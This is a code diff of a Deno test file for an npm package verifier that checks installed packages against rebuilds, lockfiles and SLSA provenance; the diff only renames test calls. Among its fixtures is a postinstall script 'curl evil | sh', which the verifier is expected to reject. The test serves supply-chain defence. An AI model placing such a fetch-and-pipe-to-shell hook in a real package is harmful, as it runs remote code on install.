@@ -11,6 +11,7 @@
  * @module
  */
 
+import { test } from "../packages/core/tests/_testing.ts";
 import { absolutePath, HttpError } from "../packages/core/mod.ts";
 import {
   assertEquals,
@@ -268,14 +269,14 @@ const problemsOf = (
   return r?.status === "mismatch" ? r.problems : [];
 };
 
-Deno.test("verifyAll: installed files equal to the rebuild, with our provenance, match", async () => {
+test("verifyAll: installed files equal to the rebuild, with our provenance, match", async () => {
   const out = await run({});
   assertEquals(out.result.get("x"), { status: "match", version: "1.0.0" });
   assertEquals(out.w.log.installs, [["@zuke-build/x@1.0.0"]]);
   assertEquals(out.w.log.verified.length, 1);
 });
 
-Deno.test("verifyAll: a changed, an extra and a missing installed file are each reported", async () => {
+test("verifyAll: a changed, an extra and a missing installed file are each reported", async () => {
   const out = await run({
     installed: {
       "package.json": '{"name":"@zuke-build/x","version":"1.0.0"}',
@@ -291,12 +292,12 @@ Deno.test("verifyAll: a changed, an extra and a missing installed file are each 
   assertEquals(problemsOf(gone).length, 2);
 });
 
-Deno.test("verifyAll: a lockfile that records another integrity is a mismatch", async () => {
+test("verifyAll: a lockfile that records another integrity is a mismatch", async () => {
   const out = await run({ lockIntegrity: integrityOf(8).integrity });
   assertStringIncludes(problemsOf(out)[0], "version or integrity other than");
 });
 
-Deno.test("verifyAll: registry metadata that only adds its own bookkeeping matches", async () => {
+test("verifyAll: registry metadata that only adds its own bookkeeping matches", async () => {
   const out = await run({
     metadata: {
       _id: "@zuke-build/x@1.0.0",
@@ -312,7 +313,7 @@ Deno.test("verifyAll: registry metadata that only adds its own bookkeeping match
   assertEquals(out.result.get("x")?.status, "match");
 });
 
-Deno.test("verifyAll: metadata that differs from the rebuilt package.json in a field npm acts on fails", async () => {
+test("verifyAll: metadata that differs from the rebuilt package.json in a field npm acts on fails", async () => {
   const cases: Array<[string, Record<string, unknown>]> = [
     ["scripts", { scripts: { postinstall: "curl evil | sh" } }],
     ["dependencies", { dependencies: { evil: "1.0.0" } }],
@@ -344,7 +345,7 @@ function aliasEntry(over: Record<string, unknown> = {}) {
   };
 }
 
-Deno.test("verifyAll: a lockfile with another package, an install script or a bin fails", async () => {
+test("verifyAll: a lockfile with another package, an install script or a bin fails", async () => {
   const other = await run({
     lockExtra: { "node_modules/evil": { version: "1.0.0" } },
   });
@@ -367,7 +368,7 @@ Deno.test("verifyAll: a lockfile with another package, an install script or a bi
   assertStringIncludes(problemsOf(gone)[0], "no entry for @zuke-build/x");
 });
 
-Deno.test("verifyAll: every alias is pinned to the verified version, and matches it", async () => {
+test("verifyAll: every alias is pinned to the verified version, and matches it", async () => {
   const out = await run({
     lockExtra: aliasEntry(),
     aliasInstalled: {
@@ -381,7 +382,7 @@ Deno.test("verifyAll: every alias is pinned to the verified version, and matches
   });
 });
 
-Deno.test("verifyAll: an alias with another integrity, another version, other files or no verification fails", async () => {
+test("verifyAll: an alias with another integrity, another version, other files or no verification fails", async () => {
   const integrity = await run({
     lockExtra: aliasEntry({ integrity: integrityOf(8).integrity }),
   });
@@ -424,7 +425,7 @@ Deno.test("verifyAll: an alias with another integrity, another version, other fi
   );
 });
 
-Deno.test("verifyAll: a package whose dependency is missing or failed is not verified either", async () => {
+test("verifyAll: a package whose dependency is missing or failed is not verified either", async () => {
   // `x` is not on npm and that is allowed: it is skipped, and so is `y`.
   const skipped = await run(
     { packages: ["y"], allowMissing: true },
@@ -445,7 +446,7 @@ Deno.test("verifyAll: a package whose dependency is missing or failed is not ver
   assertStringIncludes(problemsOf(failed, "x")[0], "not on npm");
 });
 
-Deno.test("verifyAll: provenance for another repository, workflow, ref, commit or bytes fails before anything is installed", async () => {
+test("verifyAll: provenance for another repository, workflow, ref, commit or bytes fails before anything is installed", async () => {
   for (
     const stmt of [
       { repository: "https://github.com/evil/zuke" },
@@ -474,7 +475,7 @@ Deno.test("verifyAll: provenance for another repository, workflow, ref, commit o
   assertStringIncludes(problemsOf(other)[0], "no subject has the sha512");
 });
 
-Deno.test("verifyAll: no attestation, or a bundle that does not verify, fails", async () => {
+test("verifyAll: no attestation, or a bundle that does not verify, fails", async () => {
   assertEquals(problemsOf(await run({ attested: false })), [
     "the version has no SLSA provenance attestation.",
   ]);
@@ -484,7 +485,7 @@ Deno.test("verifyAll: no attestation, or a bundle that does not verify, fails", 
   );
 });
 
-Deno.test("verifyAll: a version missing from npm fails after the retries, and is skipped only when allowed", async () => {
+test("verifyAll: a version missing from npm fails after the retries, and is skipped only when allowed", async () => {
   const missing = await run({ document: () => ({ versions: {} }) });
   assertEquals(problemsOf(missing), ["version 1.0.0 is not on npm."]);
   assertEquals(missing.w.log.waits, 2);
@@ -499,14 +500,14 @@ Deno.test("verifyAll: a version missing from npm fails after the retries, and is
   assertEquals(allowed.w.log.waits, 0);
 });
 
-Deno.test("verifyAll: a version entry without a usable dist is a failure, not a skip", async () => {
+test("verifyAll: a version entry without a usable dist is a failure, not a skip", async () => {
   const out = await run({
     document: () => ({ versions: { "1.0.0": { dist: { tarball: "t" } } } }),
   });
   assertStringIncludes(problemsOf(out)[0], "without a usable dist.tarball");
 });
 
-Deno.test("verifyAll: each distinct provenance commit is rebuilt once, with its own packages", async () => {
+test("verifyAll: each distinct provenance commit is rebuilt once, with its own packages", async () => {
   const other = "abcdef0123456789abcdef0123456789abcdef01";
   const out = await run(
     { packages: ["x", "y", "z"], commits: { z: other } },
@@ -526,7 +527,7 @@ Deno.test("verifyAll: each distinct provenance commit is rebuilt once, with its 
   assertEquals(out.w.log.mastered, [OURS.commit, OURS.commit, other]);
 });
 
-Deno.test("verifyAll: a commit that is not on master, or not a SHA, fails before any build", async () => {
+test("verifyAll: a commit that is not on master, or not a SHA, fails before any build", async () => {
   const off = await run({ offMaster: [OURS.commit] });
   assertEquals(problemsOf(off), [`provenance: ${OURS.commit} is off master.`]);
   assertEquals(off.w.log.builds, []);
@@ -540,7 +541,7 @@ Deno.test("verifyAll: a commit that is not on master, or not a SHA, fails before
   assertEquals(unsigned.w.log.mastered, []);
 });
 
-Deno.test("verifyAll: a statement commit the certificate does not attest fails before master or a build", async () => {
+test("verifyAll: a statement commit the certificate does not attest fails before master or a build", async () => {
   // The statement says OURS.commit; the certificate was issued for another.
   const out = await run({ certCommit: "e".repeat(40) });
   assertStringIncludes(problemsOf(out)[0], "did not verify");
@@ -554,7 +555,7 @@ Deno.test("verifyAll: a statement commit the certificate does not attest fails b
   assertEquals(same.result.get("x")?.status, "match");
 });
 
-Deno.test("verifyAll: a commit that cannot be rebuilt fails its packages and not the others", async () => {
+test("verifyAll: a commit that cannot be rebuilt fails its packages and not the others", async () => {
   const other = "abcdef0123456789abcdef0123456789abcdef01";
   const out = await run(
     {
@@ -571,7 +572,7 @@ Deno.test("verifyAll: a commit that cannot be rebuilt fails its packages and not
   ]);
 });
 
-Deno.test("only mismatches fail, and comparing nothing fails unless allowed", () => {
+test("only mismatches fail, and comparing nothing fails unless allowed", () => {
   const ok: VerifyResult = { status: "match" };
   const skipped: VerifyResult = { status: "skipped", reason: "no" };
   const bad: VerifyResult = {
@@ -595,7 +596,7 @@ Deno.test("only mismatches fail, and comparing nothing fails unless allowed", ()
   );
 });
 
-Deno.test("auditSignatures: a failing npm fails it", async () => {
+test("auditSignatures: a failing npm fails it", async () => {
   const npm = (fail: boolean): NpmProbe => ({
     install: () => Promise.resolve(),
     auditSignatures: () =>
@@ -612,7 +613,7 @@ Deno.test("auditSignatures: a failing npm fails it", async () => {
   );
 });
 
-Deno.test("the npm build pins LF, and a manifest does not depend on key order or path", () => {
+test("the npm build pins LF, and a manifest does not depend on key order or path", () => {
   const config = npmTsconfig([], "/a/packages", "/a/dist");
   const options = config.compilerOptions;
   assertEquals(
@@ -635,7 +636,7 @@ Deno.test("the npm build pins LF, and a manifest does not depend on key order or
   assertEquals(json.includes("/home"), false);
 });
 
-Deno.test("verifyAll: attestations that are not there yet are looked for again", async () => {
+test("verifyAll: attestations that are not there yet are looked for again", async () => {
   // The registry serves the version before its attestations (#1100's run).
   const late = await run({ attestationMisses: 2 });
   assertEquals(late.result.get("x"), { status: "match", version: "1.0.0" });
